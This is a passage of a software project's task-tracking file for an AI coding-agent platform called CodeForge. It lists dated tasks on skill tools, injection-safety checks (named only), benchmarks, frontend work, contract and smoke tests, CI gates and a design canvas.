- [x] T9.2: Implement SearchSkillsTool (ToolDefinition + ToolExecutor) (2026-03-09)
  - File: `workers/codeforge/tools/search_skills.py`
- [x] T9.3: Register in `build_default_registry()` in `workers/codeforge/tools/__init__.py` (2026-03-09)
- [x] T9.4: Run tests — all pass (2026-03-09)
- [x] T9.5: Commit (2026-03-09)

#### Task 10: Python `create_skill` Tool (Priority: HIGH)
- [x] T10.1: Write tests for validation, draft save, injection rejection, content length limit (2026-03-09)
  - File: `workers/tests/test_tool_create_skill.py`
- [x] T10.2: Implement CreateSkillTool with validation, regex safety check, DB save as draft (2026-03-09) (the save fails today, see [KI-58](#known-issues))
  - File: `workers/codeforge/tools/create_skill.py`
- [x] T10.3: Register in `build_default_registry()` (2026-03-09)
- [x] T10.4: Run tests — all pass (2026-03-09)
- [x] T10.5: Commit (2026-03-09)

#### Task 11: Python Safety Check — LLM-based injection detection (Priority: MEDIUM)
- [x] T11.1: Write tests for safe content, unsafe content, LLM error fallback (2026-03-09)
  - File: `workers/tests/test_skill_safety.py`
- [x] T11.2: Implement `check_skill_safety()` with LLM call using cheapest model (2026-03-09)
  - File: `workers/codeforge/skills/safety.py`
- [x] T11.3: Run tests — all pass (2026-03-09)
- [x] T11.4: Commit (2026-03-09)

#### Task 12: Update Conversation Consumer — LLM skill selection (Priority: CRITICAL)
- [x] T12.1: Write test for new injection flow (LLM selection, sandboxed `<skill>` tags, workflow/pattern separation) (2026-03-09)
- [x] T12.2: Replace `_inject_skill_recommendations()` with `_inject_skills()` in `_build_system_prompt()` (2026-03-09)
  - File: `workers/codeforge/consumer/_conversation.py`
- [x] T12.3: Add sandboxing instruction to system prompt (2026-03-09)
- [x] T12.4: Run full conversation consumer tests — all pass (2026-03-09)
- [x] T12.5: Commit (2026-03-09)

#### Task 13: Meta-Skill — Built-in skill creator (Priority: MEDIUM)
- [x] T13.1: Write test that meta-skill YAML parses correctly (2026-03-09)
  - File: `workers/tests/test_builtin_skills.py`
- [x] T13.2: Create meta-skill YAML with schema docs, examples, quality criteria (2026-03-09)
  - File: `workers/codeforge/skills/builtins/codeforge-skill-creator.yaml`
- [x] T13.3: Add builtin loader to SkillRegistry (2026-03-09)
  - File: `workers/codeforge/skills/registry.py`
- [x] T13.4: Run tests — all pass (2026-03-09)
- [x] T13.5: Commit (2026-03-09)

#### Task 14: Go Import Handler — HTTP endpoint (Priority: MEDIUM)
- [x] T14.1: Implement `POST /api/v1/skills/import` handler (URL fetch, format detect, safety score, save) (2026-03-09)
  - File: `internal/adapter/http/handlers_agent_features.go` (`ImportSkill`)
- [x] T14.2: Add route to `routes.go` (2026-03-09)
- [x] T14.3: Write handler tests (2026-03-09)
- [x] T14.4: Commit (2026-03-09)

#### Task 15: WebSocket Skill Draft Notification (Priority: LOW)
- [x] T15.1: Add `SkillDraftEvent` struct (2026-03-09) — now in `internal/domain/event/broadcast_payloads.go`
- [ ] T15.2: Emit `skill.draft` WebSocket event when the agent creates a skill draft (type and constant exist in `internal/domain/event`, no emitter or frontend listener yet)
- [x] T15.3: Commit (2026-03-09)

#### Task 16: Documentation and Exports (Priority: LOW)
- [x] T16.1: Update `workers/codeforge/skills/__init__.py` exports (2026-03-09)
- [x] T16.2: Update `CLAUDE.md` with skills system references (2026-03-09)
- [x] T16.3: Update `docs/features/04-agent-orchestration.md` (2026-03-09)
- [x] T16.4: Mark completed tasks in `docs/todo.md` (2026-03-09)
- [x] T16.5: Final commit (2026-03-09)

#### Adaptive Context Injection (COMPLETED)
- [x] (2026-03-09) AdaptiveContextBudget function: linear decay from base budget to 0 over 60 messages
- [x] (2026-03-09) Wire adaptive budget into conversation dispatch (buildConversationContextEntries)
- [x] (2026-03-09) Auto-trigger all indexes (RepoMap, Retrieval, GraphRAG) after clone/adopt/setup
- [x] (2026-03-09) Update documentation (CLAUDE.md, feature spec, todo)

#### Feature Activation Sweep (COMPLETED)
- [x] (2026-03-09) Activate Context Optimizer by default (ContextEnabled=true in Go config)
- [x] (2026-03-09) Add 16 missing env-var bindings in loader.go (agent context, quarantine, LSP, review router, copilot, routing, experience)
- [x] (2026-03-09) Add tenant_id to ConversationRunStartPayload (Go NATS + Python Pydantic) for Experience Pool isolation (the worker pool still uses the zero tenant, see [KI-16](#known-issues))
- [x] (2026-03-09) Add max_entries eviction logic to Experience Pool store()
- [x] (2026-03-09) Integrate Experience Pool into AgentLoopExecutor (pre-loop cache check + post-loop store)
- [x] (2026-03-09) Jaeger collector in `docker-compose.yml`; OTEL tracing is opt-in (`otel.enabled`, default false; enable it in your local `codeforge.yaml`, see [KI-36](#known-issues))
- [x] (2026-03-09) Fix routing default inconsistency (config.py default aligned to True)
- [x] (2026-03-09) Documentation updates (env vars in dev-setup.md, experience pool in agent-orchestration.md)

---

### Benchmark External Providers, Auto-Routing & Prompt Optimization (COMPLETED)

> Design: [docs/specs/2026-03-09-benchmark-external-providers-design.md](specs/2026-03-09-benchmark-external-providers-design.md)
> Plan: [docs/plans/2026-03-09-benchmark-external-providers-plan.md](plans/2026-03-09-benchmark-external-providers-plan.md)

- [x] (2026-03-09) Migration 068: routing tracking columns (selected_model, routing_reason, fallback_chain, fallback_count, provider_errors)
- [x] (2026-03-09) Domain: routing fields on Result, ProviderConfig on CreateRunRequest, ModelFamily utility
- [x] (2026-03-09) Store: updated INSERT/scan for 5 new routing columns
- [x] (2026-03-09) NATS payloads: provider_name/config on BenchmarkRunRequestPayload, routing fields on BenchmarkTaskResult, ModelAdaptations on ModePayload
- [x] (2026-03-09) Service: suite-based StartRun with provider_name resolution, mergeProviderConfig, SeedDefaultSuites (11 suites)
- [x] (2026-03-09) Python: universal task filter with difficulty/shuffle/seed/max_tasks/task_percentage (9 tests)
- [x] (2026-03-09) Python: config parameter on all 8 external provider constructors, auto-import in __init__.py
- [x] (2026-03-09) Python consumer: provider-based task loading with legacy fallback, _RoutingLLMWrapper for auto-model, routing report
- [x] (2026-03-09) Python: prompt optimizer with LLM-as-Critic failure analysis (9 tests)
- [x] (2026-03-09) Go: POST /runs/{id}/analyze endpoint for prompt optimization
- [x] (2026-03-09) Mode: ModelAdaptations map on Mode struct, appendModelAdaptation in conversation_agent.go
- [x] (2026-03-09) Frontend types: ProviderConfig, RoutingReport, PromptAnalysisReport, TacticalFix interfaces
- [x] (2026-03-09) Frontend: suite dropdown with optgroup Local/External, TaskSettings component, auto-model checkbox
- [x] (2026-03-09) Frontend: RoutingReport (model distribution, fallback timeline, provider status), SuiteManagement provider dropdown
- [x] (2026-03-09) Frontend: PromptOptimizationPanel with analyze/accept/reject
- [x] (2026-03-09) Frontend: analyzeRun API client method
- [x] (2026-03-09) i18n: 27+ benchmark keys in EN + DE

---

### Feature Roadmap -- Consolidated Open Items

> Extracted from `docs/features/*.md` and centralized here per documentation policy.
> Feature docs now reference this file instead of maintaining their own TODO lists.

#### Mobile-Responsive Frontend (COMPLETED)
- [x] (2026-03-08) useBreakpoint hook, CSS foundation (safe-area, touch targets, scrollbar-none), viewport-fit
- [x] (2026-03-08) Primitives/composites: Button touch targets (36-48px), NavLink 44px, Modal/Table/Card/PageLayout responsive
- [x] (2026-03-08) 3-state sidebar (hidden+overlay on mobile, collapsed on tablet, expanded on desktop), hamburger menu
- [x] (2026-03-08) Responsive grids: CostDashboard, CostAnalysis, MultiCompare, PromptEditor, WarRoom, CompactSettings
- [x] (2026-03-08) ProjectDetailPage: mobile tab-switch (Panels/Chat), scrollable sub-tabs, responsive header
- [x] (2026-03-08) ChatPanel: responsive bubbles (90%/75%), flex-wrap header, text size fixes
- [x] (2026-03-08) FilePanel: mobile file tree drawer overlay with backdrop
- [x] (2026-03-08) Fix pre-existing i18n errors (featuremap.dragToMove, statusToggled, dropHere)

#### Codebase Optimization -- Full Overhaul (COMPLETED)
- [x] (2026-03-08) Go: Deleted duplicate `internal/crypto/crypto/aes.go` (byte-for-byte copy)
- [x] (2026-03-08) Go: Generic `scanRows[T]` in `internal/adapter/postgres/helpers.go`, `writeJSONList[T]` and `queryParamInt` in `internal/adapter/http/helpers.go`
- [x] (2026-03-08) Go: Migrated 27 store files from manual `for rows.Next()` to `scanRows()` (~350 lines removed)
- [x] (2026-03-08) Go: Migrated ~14 handler files from manual `strconv.Atoi` to `queryParamInt()` and `writeJSONList()`
- [x] (2026-03-08) Go: Removed duplicate `nilIfEmpty()` in `store_benchmark.go`, consolidated to `nullIfEmpty()` in helpers
- [x] (2026-03-08) Go: Externalized hardcoded server timeouts and stale-work thresholds to `config.go` with yaml/env tags
- [x] (2026-03-08) Python: Shared `coerce_none_to_list` validator in `_validators.py`, replaced duplicate Pydantic validators
- [x] (2026-03-08) Python: `@catch_os_error` decorator in `tools/_error_handler.py`, applied to read/write/edit tools
- [x] (2026-03-08) Python: `_extract_cost()` static method in `llm.py`, replaced 3 duplicate header-parsing blocks
- [x] (2026-03-08) Python: `BaseBenchmarkRunner` ABC in `evaluation/runners/_base.py`, 3 runners refactored
- [x] (2026-03-08) Python: `RoutingConfig` dataclass with complexity weights/tier thresholds/task type boosts
- [x] (2026-03-08) Python: OpenHands timeouts externalized to env vars via `_env_float()` helper
- [x] (2026-03-08) Python: Consumer `_handle_request()` generic handler -- 10 NATS handlers migrated, 6 skipped (too complex)
- [x] (2026-03-08) Python: Consumer backoff constants externalized to env vars
- [x] (2026-03-08) Frontend: `cx()` class-name utility in `utils/cx.ts`, adopted across UI components
- [x] (2026-03-08) Frontend: `getErrorMessage()` in `utils/getErrorMessage.ts`, adopted in 6+ pages
- [x] (2026-03-08) Frontend: `StatCard`, `ResourceView`, `GridLayout` shared components
- [x] (2026-03-08) Frontend: `useFocusTrap` hook extracted from Modal.tsx
- [x] (2026-03-08) Frontend: `useFormState` hook -- BenchmarkPage (5 signals) and DashboardPage (8 signals) consolidated
- [x] (2026-03-08) Frontend: `useAsyncAction` hook -- adopted in AuditTable, FilePanel, PolicyPanel, 4+ more pages
- [x] (2026-03-08) Frontend: `CHART_COLORS` and `RADAR_DEFAULTS` design constants extracted
- [x] (2026-03-09) Dashboard Polish: KPI strip (7 stat cards with trend deltas), HealthDot (traffic-light per-project), ChartsPanel (5 Unovis tabs: cost trend, run outcomes, agents, models, cost/project), ActivityTimeline (WebSocket-fed 5-tier priority), CreateProjectModal extracted, ProjectCard enhanced with health + stats row

#### Pillar 1: Project Dashboard

- [x] (2026-03-09) Implement GitHub adapter with OAuth flow -- domain model, state store, service, HTTP handlers, `github-api` git provider, frontend OAuth connect button (OAuth service never wired, `/api/v1/auth/github` returns 501, see [KI-55](#known-issues))
- [x] (2026-03-09) Verify GitHub adapter compatibility with Forgejo/Codeberg -- provider aliases, variant config, detection, tests
- [x] (2026-03-09) Batch operations across selected repos -- batch API endpoints, store methods, frontend multi-select UI
- [x] (2026-03-09) Cross-repo search (code, issues) -- Go aggregation endpoint, frontend SearchPage with debounced input + project filter

#### Pillar 4: Agent Orchestration

- [x] (2026-03-09) Enhance CLI wrappers for Goose, OpenHands, OpenCode, Plandex -- streaming via NATS bridge, config passthrough, health check endpoints
- [x] (2026-03-09) Trajectory replay UI and audit trail -- TrajectoryPanel with event timeline, rewind with confirmation, export button, trajectory tab in ProjectDetailPage
- [x] (2026-03-09) Session events as source of truth (Resume/Fork/Rewind) -- session controls in ChatPanel, session indicators in conversation list, rewind with event picker UX

---

### Integration Testing Strategy (A + B + C)

> Design: [docs/specs/2026-03-08-integration-testing-design.md](specs/2026-03-08-integration-testing-design.md)
> Goal: Verify that all 30 major features work together across Go, Python, and Frontend layers.
> Tracking: `scripts/verify-features.sh` (prints the matrix to stdout, JSON summary in `/tmp/verification-summary.json`; `docs/feature-verification-matrix.md` is not created yet)

#### B1: Fix Broken Foundation Tests (Priority: CRITICAL) -- DONE 2026-03-08

> 10 Go Postgres Store tests were FAILING due to non-idempotent migration 065.
> Root cause: bare `ALTER TABLE ADD COLUMN` without `IF NOT EXISTS` guards.
> Fix: `internal/adapter/postgres/migrations/065_benchmark_result_rollout_fields.sql`

- [x] Fix `TestStore_ProjectCRUD` -- migration 065 idempotency fix
- [x] Fix `TestStore_UserCRUD` -- migration 065 idempotency fix
- [x] Fix `TestStore_TokenRevocation` -- migration 065 idempotency fix
- [x] Fix `TestStore_Conversation_TenantIsolation` -- migration 065 idempotency fix
- [x] Fix `TestStore_GetProjectByRepoName_TenantIsolation` -- migration 065 idempotency fix
- [x] Fix `TestStore_A2ATask_TenantIsolation` -- migration 065 idempotency fix
- [x] Fix `TestStore_ListA2ATasks_TenantIsolation` -- migration 065 idempotency fix
- [x] Fix `TestStore_ListA2ATasks_LimitParameterized` -- migration 065 idempotency fix
- [x] Fix `TestStore_RemoteAgent_TenantIsolation` -- migration 065 idempotency fix
- [x] Fix `TestStore_ListRemoteAgents_TenantIsolation` -- migration 065 idempotency fix
- [x] Verify `go test ./internal/...` passes 100% green after all fixes

#### B2: NATS Payload Contract Tests (Priority: HIGH) -- DONE 2026-03-08

> Go side: `internal/port/messagequeue/contract_test.go` (39 sample factories, roundtrip + fixture generation)
> Python side: `workers/tests/test_nats_contracts.py` (80 parametrized tests, fixture validation + field coverage)
> Fixtures: `internal/port/messagequeue/testdata/contracts/*.json` (31 files, Go-generated)
> Contract violation found & fixed: `BenchmarkRunResult` Python model was missing `tenant_id`

**Infrastructure:**

- [x] Create Go contract test generator -- `TestContract_GenerateFixtures` writes 31 JSON fixtures
- [x] Create Python contract validator -- 80 parametrized tests: fixture parse, roundtrip, field coverage, required fields
- [x] Create reverse contract test -- Python roundtrip (Pydantic parse → dump → re-parse)
- [x] Add contract test verification checklist -- field coverage, required fields, tenant_id presence

**NATS payload contract coverage (20 of 24 listed subjects; `memory.*` and `handoff.request` still missing):**

- [x] Contract test: `conversation.run.start` -- PASS
- [x] Contract test: `conversation.run.complete` -- PASS
- [x] Contract test: `benchmark.run.request` -- PASS
- [x] Contract test: `benchmark.run.result` -- PASS (fixed missing `tenant_id` in Python model)
- [x] Contract test: `evaluation.gemmas.request` -- PASS
- [x] Contract test: `evaluation.gemmas.result` -- PASS
- [ ] Contract test: `memory.store` -- fixture not yet generated
- [ ] Contract test: `memory.recall` -- fixture not yet generated
- [ ] Contract test: `memory.recall.result` -- fixture not yet generated
- [x] Contract test: `repomap.generate.request` -- PASS
- [x] Contract test: `repomap.generate.result` -- PASS
- [x] Contract test: `retrieval.index.request` -- PASS
- [x] Contract test: `retrieval.index.result` -- PASS
- [x] Contract test: `retrieval.search.request` -- PASS
- [x] Contract test: `retrieval.search.result` -- PASS
- [x] Contract test: `retrieval.subagent.request` -- PASS
- [x] Contract test: `retrieval.subagent.result` -- PASS
- [x] Contract test: `graph.build.request` -- PASS
- [x] Contract test: `graph.build.result` -- PASS
- [x] Contract test: `graph.search.request` -- PASS
- [x] Contract test: `graph.search.result` -- PASS
- [x] Contract test: `a2a.task.created` -- PASS
- [x] Contract test: `a2a.task.complete` -- PASS
- [ ] Contract test: `handoff.request` -- fixture not yet generated

#### B3: Unit Tests for Untested Critical Modules (Priority: HIGH) -- DONE 2026-03-08

> 405+ tests created across Python and Go. All use mocks/fakes -- no Docker or external services needed.

**Python Agent Tools (134 tests across 6 test files):**

- [x] Test `tool_read.py` -- `workers/tests/test_tool_read_file.py` (22 tests)
- [x] Test `tool_write.py` -- `workers/tests/test_tool_write_file.py` (17 tests)
- [x] Test `tool_edit.py` -- `workers/tests/test_tool_edit_file.py` (15 tests)
- [x] Test `tool_bash.py` -- `workers/tests/test_tool_bash.py` (20 tests)
- [x] Test `tool_search.py`, `tool_glob.py`, `tool_listdir.py` -- `workers/tests/test_tool_search_glob_listdir.py` (35 tests)
- [x] Test tool registry -- `workers/tests/test_tool_registry.py` (25 tests)

**Python Consumer Dispatch (34 tests):**

- [x] Test `_base.py` -- duplicate detection, mixin helpers, DLQ -- `workers/tests/test_consumer_dispatch.py`
- [x] Test `_conversation.py` -- agentic vs simple routing, model resolution
- [x] Test duplicate detection -- `_is_duplicate()`, eviction behavior
- [x] Test error handling -- exception capture, error result publish
- [x] Test subject registration -- subject constants match Go side

**Python Memory System (26 tests):**

- [x] Test `scorer.py` -- composite scoring, recency decay, edge cases -- `workers/tests/test_memory_system.py`
- [x] Test `experience.py` -- `@exp_cache` decorator: hit, miss, key generation
- [x] Test vector storage interface -- store, recall, empty results

**Go Adapters (58 tests across 5 files):**

- [x] Test `adapter/a2a/` -- AgentCard, security schemes, skills -- `internal/adapter/a2a/agentcard_test.go` (16 tests)
- [x] Test `adapter/lsp/` -- JSON-RPC, notification, capability -- `internal/adapter/lsp/client_test.go` (15 tests)
- [x] Test `adapter/otel/` -- tracer, metrics, middleware, spans -- `internal/adapter/otel/setup_test.go` (9 tests)
- [x] Test `adapter/natskv/` -- KV get/set/delete, missing key -- `internal/adapter/natskv/cache_test.go` (8 tests)
- [x] Test `adapter/ristretto/` -- cache get/set/delete, TTL, eviction -- `internal/adapter/ristretto/cache_test.go` (10 tests)

**Go Domain Models (39 tests across 5 files):**

- [x] Test `domain/conversation/` -- creation, validation, status -- `internal/domain/conversation/conversation_test.go` (9 tests)
- [x] Test `domain/orchestration/` -- handoff model, validation -- `internal/domain/orchestration/orchestration_test.go` (4 tests)
- [x] Test `domain/microagent/` -- trigger matching, priority -- `internal/domain/microagent/microagent_test.go` (11 tests)
- [x] Test `domain/memory/` -- entity, kinds, scoring types -- `internal/domain/memory/memory_test.go` (9 tests)
- [x] Test `domain/skill/` -- creation, validation, parsing -- `internal/domain/skill/skill_test.go` (6 tests)

#### A1: Stack Health Smoke Tests (Priority: HIGH) -- DONE 2026-03-08

> Test file: `tests/integration/smoke_test.go` (build tag: `//go:build smoke`, 6 tests)
> Run: `go test -tags=smoke -count=1 -timeout=300s ./tests/integration/...`

- [x] Smoke test: Go backend `/health` returns 200 with expected fields
- [x] Smoke test: Dev mode enabled when `APP_ENV=development`
- [x] Smoke test: All API routes under `/api/v1/` prefix
- [x] Smoke test: Auth required on protected endpoints (401 without JWT)
- [x] Smoke test: LiteLLM proxy `/health` returns 200
- [x] Smoke test: NATS JetStream connected -- CODEFORGE stream exists

#### A2: Critical Flow Smoke Tests (Priority: HIGH) -- DONE 2026-03-08

> Test file: `tests/integration/flows_test.go` (build tag: `//go:build smoke`, 6 flow tests)
> Skip env vars: `SMOKE_SKIP_LLM`, `SMOKE_SKIP_LITELLM`, `SMOKE_SKIP_NATS`

- [x] Smoke flow: Project CRUD lifecycle (create, get, list, delete, verify 404)
- [x] Smoke flow: Simple conversation (create, send message, poll response, verify cost)
- [x] Smoke flow: Cost tracking (verify cost_usd, tokens_in, tokens_out after conversation)
- [x] Smoke flow: Modes list (GET /api/v1/modes returns non-empty array)
- [x] Smoke flow: Models list (GET /api/v1/llm/available returns model data)
- [x] Smoke flow: Policies (GET /api/v1/policies returns policy presets)

#### A3: CI Integration (Priority: MEDIUM) -- DONE 2026-03-08

> Added to `.github/workflows/ci.yml`

- [x] Add `contract` CI job: Go fixture generation + Python Pydantic validation (every push)
- [x] Add `smoke` CI job: full stack with Postgres+NATS services (staging/main branches only)
- [x] Configure smoke test skip env vars: `SMOKE_SKIP_LLM`, `SMOKE_SKIP_LITELLM`, `SMOKE_SKIP_NATS`
- [x] (2026-03-09) Upload verification matrix as CI artifact after smoke tests
- [x] (2026-03-09) Add CI status badge to README

#### C1: Feature Verification Matrix (Priority: MEDIUM) -- OPEN (file not created; `scripts/verify-features.sh` prints the matrix to stdout)

> File: `docs/feature-verification-matrix.md` (File not yet created)

- [ ] Create initial matrix with all 30 features listed
- [ ] Define verification criteria per feature: 5 test layers (Go Unit, Py Unit, E2E, Contract, Smoke)
- [ ] Mark currently-passing features based on test results (24 partial, 0 blocked)
- [ ] Add "Last Verified" date column
- [ ] Cross-reference: each feature row links to relevant test files

#### C2: Automated Verification Reporter (Priority: MEDIUM) -- DONE 2026-03-08

> File: `scripts/verify-features.sh`

- [x] Parse Go test output (`go test -json`) and map packages to features
- [x] Parse Python test output (`pytest --json-report`) and map modules to features
- [x] Map contract test results to features
- [x] Generate markdown table output
- [x] Generate JSON summary to `/tmp/verification-summary.json`
- [x] Exit code: 0 if critical features (1-10, 22-23) pass, 1 otherwise

#### C3: CI Verification Gate (Priority: LOW)

> Block merges to main if critical features regress. Partially covered by A3 CI jobs.

- [x] Define critical feature set: features 1-10 + 22-23 (in `scripts/verify-features.sh`)
- [x] (2026-03-09) Add verification gate as CI job (can be set as required check)
- [x] (2026-03-09) Non-critical features (A2A, LSP, Handoff, etc.): warn but don't block
  - Added `warn_non_critical()` to `scripts/verify-features.sh` — emits `::warning::` GitHub Actions annotations
- [x] (2026-03-10) Store historical verification results for trend tracking
  - Added `store_history()` and `show_trend()` functions to `scripts/verify-features.sh`
  - History stored as JSON in `data/verification-history/` with git SHA, branch, timestamp
  - `--trend` flag displays last 20 runs summary + per-feature trend across last 5 runs

#### Phase 31 -- Contract-First Review/Refactor (COMPLETED)

> **Implementation status (2026-09-29):** the components below exist, but the pipeline is not wired: `ReviewTriggerService` gets a nil orchestrator, `DiffImpactScorer` has no caller and RefactorApproval listens for the wrong event. See [KI-17](#known-issues).

- [x] Boundary domain model (ProjectBoundaryConfig, BoundaryFile) -- 2026-03-15
- [x] Plan domain: waiting_approval step status -- 2026-03-15
- [x] DB migrations (073 project_boundaries, 074 review_triggers) -- 2026-03-15
- [x] NATS subjects (review.>) for Go + Python -- 2026-03-15
- [x] Mode presets: boundary_analyzer, contract_reviewer (24 total) -- 2026-03-15
- [x] Pipeline template: review-refactor (4-step sequential) -- 2026-03-15
- [x] DiffImpactScorer (3-tier threshold HITL) -- 2026-03-15
- [x] Phase-aware context budget (boundary/contract/review/refactor phases) -- 2026-03-15
- [x] Store interface + PostgreSQL implementation (boundaries + review triggers) -- 2026-03-15
- [x] BoundaryService with CRUD and validation -- 2026-03-15
- [x] ReviewTriggerService with cascade dedup -- 2026-03-15
- [x] Orchestrator: waiting_approval status handling (approve/reject) -- 2026-03-15
- [x] HTTP endpoints: boundaries CRUD, review trigger, run approval -- 2026-03-15
- [x] Python NATS consumer: review trigger handler -- 2026-03-15
- [x] Frontend: BoundariesPanel; RefactorApproval component exists but is not functional (event name/payload mismatch with `review.approval_required`, unauthenticated fetch, see [KI-17](#known-issues)) -- 2026-03-15
- [x] Integration wiring: services in main.go + autoIndex trigger -- 2026-03-15

#### Project Workflow Redesign (COMPLETED -- 2026-03-09)

> Plan: `docs/plans/2026-03-09-project-workflow-plan.md`
> Design: `docs/specs/2026-03-09-project-workflow-redesign-design.md`

- [x] Reorder project tabs: Files, Goals, Roadmap, Feature Map, War Room, Sessions, Trajectory, Audit (2026-03-09)
- [x] Add i18n keys for onboarding, empty states, and chat suggestions (2026-03-09)
- [x] Add empty states with navigation links to all 8 tab panels (2026-03-09)
- [x] Proactive agent greeting on first chat open per project (localStorage-gated) (2026-03-09)
- [x] Lint, TypeScript verify, pre-commit pass (2026-03-09)

#### Phase 32 -- Visual Design Canvas

> Feature spec: `docs/features/06-visual-design-canvas.md`

**Phase 32A -- Canvas Types & State (Frontend)**
- [x] 32A.1: Create `canvasTypes.ts` -- all type definitions (CanvasElement, ElementStyle, tool types) (2026-03-16)
- [x] 32A.2: Write tests for canvas state store (add/remove/update/undo/redo/select) (2026-03-16)
- [x] 32A.3: Implement `canvasState.ts` -- SolidJS createStore with undo/redo (2026-03-16)

**Phase 32B -- SVG Viewport & Select Tool (Frontend)**
- [x] 32B.1: Write tests for `screenToSvg` coordinate transform (2026-03-16)
- [x] 32B.2: Implement `DesignCanvas.tsx` -- main SVG component with viewport (2026-03-16)
- [x] 32B.3: Implement `SelectTool.ts` -- select, move, resize via pointer capture (2026-03-16)

**Phase 32C -- Shape Tools (Frontend)**
- [x] 32C.1: Implement `RectTool.ts` -- rectangle creation via drag (2026-03-16)
- [x] 32C.2: Implement `EllipseTool.ts` -- ellipse/circle creation (Shift constraint) (2026-03-16)
- [x] 32C.3: Write tests for Catmull-Rom path smoothing (2026-03-16)
- [x] 32C.4: Implement `FreehandTool.ts` -- freehand SVG path with smoothing (2026-03-16)
- [x] 32C.5: Implement `TextTool.ts` -- click-to-place text via foreignObject (2026-03-16)

**Phase 32D -- Image Upload & Annotation (Frontend)**
- [x] 32D.1: Implement `ImageTool.ts` -- file upload, base64, 5MB limit (2026-03-16)
- [x] 32D.2: Implement `AnnotateTool.ts` -- arrow + callout annotation (2026-03-16)

**Phase 32E -- Toolbar & Modal (Frontend)**
- [x] 32E.1: Implement `CanvasToolbar.tsx` -- tool selector with keyboard shortcuts (2026-03-16)
- [x] 32E.2: Implement `CanvasModal.tsx` -- fullscreen modal wrapper (2026-03-16)

**Phase 32F -- Export Pipeline (Frontend)**
- [x] 32F.1: Write tests for PNG export (2026-03-16)
- [x] 32F.2: Implement `exportPng.ts` -- SVG to PNG via offscreen canvas (2026-03-16)
- [x] 32F.3: Write tests for ASCII art export (2026-03-16)
- [x] 32F.4: Implement `exportAscii.ts` -- element tree to character grid (2026-03-16)
- [x] 32F.5: Write tests for JSON export (2026-03-16)
- [x] 32F.6: Implement `exportJson.ts` -- structured JSON description (2026-03-16)
- [x] 32F.7: Implement `CanvasExportPanel.tsx` -- export preview sidebar (2026-03-16)

**Phase 32L -- Canvas Tool Improvements (Frontend)**
- [x] 32L.1: 8-point resize handles on SelectTool with Shift aspect-ratio lock (2026-03-17)
- [x] 32L.2: Inline text/annotation editing via double-click (foreignObject textarea) (2026-03-17)
- [x] 32L.3: Fix freehand movement + apply Catmull-Rom smoothing in renderer (2026-03-17)
- [x] 32L.4: PolygonTool -- multi-click polygon, close on first-vertex or double-click (2026-03-17)
- [x] 32L.5: NodeTool -- drag individual vertices on polygon/freehand/annotation (2026-03-17)
- [x] 32L.6: ImageTool drag-to-size with preview rect (2026-03-17)
- [x] 32L.7: Delete/Backspace removes selected elements (2026-03-17)
- [x] 32L.8: Collapsible + resizable export panel with drag handle (2026-03-17)
- [x] 32L.9: Polygon ASCII export via Bresenham line rasterization (2026-03-17)

**Phase 32G -- Phase 1 Integration & E2E Tests**
- [x] 32G.1: E2E test -- canvas basic interactions (2026-03-18)
- [x] 32G.2: E2E test -- export pipeline (2026-03-18)
- [x] 32G.3: Add canvas entry point to ProjectDetailPage (2026-03-18)

**Phase 32H -- Go Backend Multimodal Pipeline (COMPLETED 2026-03-18)**
- [x] 32H.1: Write failing Go test -- MessageImage serialization (2026-03-18)
- [x] 32H.2: Add MessageImage to Go domain types (2026-03-18) — `internal/domain/conversation/conversation.go`
- [x] 32H.3: Write database migration 075_add_message_images.sql (2026-03-18)
- [x] 32H.4: Update message store to read/write images JSONB (2026-03-18) — `store_conversation.go`
- [x] 32H.5: Write failing Go test -- NATS payload with images (2026-03-18)
- [x] 32H.6: Add MessageImagePayload to NATS schema (2026-03-18) — `internal/port/messagequeue/schemas_conversation.go`
- [x] 32H.7: Update historyToPayload to propagate images (2026-03-18) — `conversation_agent.go:863-869`
- [x] 32H.8: Run full Go test suite -- no regressions (2026-03-18)

**Phase 32I -- Python Workers Multimodal Pipeline (COMPLETED 2026-03-18)**
- [x] 32I.1: Write failing Python test -- MessageImagePayload model (2026-03-18)
- [x] 32I.2: Add MessageImagePayload to Python models (2026-03-18) — `models.py:433-449`
- [x] 32I.3: Write failing Python test -- history builder multimodal output (2026-03-18)
- [x] 32I.4: Update _to_msg_dict for multimodal content-array (2026-03-18) — `history.py:135-171`
- [x] 32I.5: Contract test -- Go marshal to Python unmarshal (2026-03-18) — standalone tests in `schemas_test.go` + `test_multimodal.py`
- [x] 32I.6: Run full Python test suite -- no regressions (2026-03-18)

**Phase 32J -- Frontend Multimodal Types (COMPLETED 2026-03-18)**
- [x] 32J.1: Add MessageImage to frontend types.ts (2026-03-18) — `types.ts:1392-1395`
- [x] 32J.2: Update ChatPanel to render image thumbnails (2026-03-18) — `ChatPanel.tsx:849-865`

**Phase 32K -- Canvas-to-Chat Integration**
- [x] 32K.1: Add supports_vision to Go model discovery (2026-03-16)
- [x] 32K.2: Add supports_vision to frontend LLMModel type (done in 32J)
- [x] 32K.3: Implement buildCanvasPrompt() utility (2026-03-16)
- [x] 32K.4: Write tests for buildCanvasPrompt() (2026-03-16)
- [x] 32K.5: Wire canvas export to ChatPanel send (2026-03-16)
- [x] 32K.6: E2E test -- canvas to chat flow (2026-03-18)

#### Stub & Placeholder Cleanup (2026-03-17)

> Tracker: `docs/audits/stub-tracker.md` (full details, file:line references, effort estimates)

**Quick Wins (small effort, high impact):**
- [x] STUB-002: Convert `StubBackendExecutor` to ABC with `@abstractmethod` on `info` property (2026-03-17)
- [x] STUB-005: Add `mode` + `model` columns to conversations table, implement UPDATE queries (2026-03-17)
- [x] STUB-011: Refactor `detectGoalFiles()` to use intermediate `DetectedGoal` type (2026-03-17)

**Medium Effort:**
- [x] STUB-004: Wire stall detection (`countStallIterations`) into conversation agent template data (2026-03-18) — BudgetPercent still 0.0, needs Python worker cost reporting
- [x] STUB-003: Implement review trigger dispatch to boundary_analyzer agent loop (`workers/codeforge/consumer/_review.py:35`) (2026-03-18)
- [x] STUB-009: Add trajectory event `sequence_number` (Go) + frontend dedup + WS reconnect re-hydration (`frontend/src/features/benchmarks/BenchmarkPage.tsx:131-135`) (2026-03-18)
- [x] STUB-006: A2A agent card skills already built dynamically in SDK-based `CardBuilder` (`internal/adapter/a2a/agentcard.go`) (2026-03-18)
- [x] STUB-012: Pipeline `Instantiate()` auto-generates TaskID/AgentID UUIDs when nil (2026-03-18)

**Large Effort (phase-level):**
- [x] STUB-001: A2A Python consumer mixin (`workers/codeforge/consumer/_a2a.py`) + PostgreSQL persistence already in SDK implementation (2026-03-18) — Cleanup: delete dead code `internal/port/a2a/`
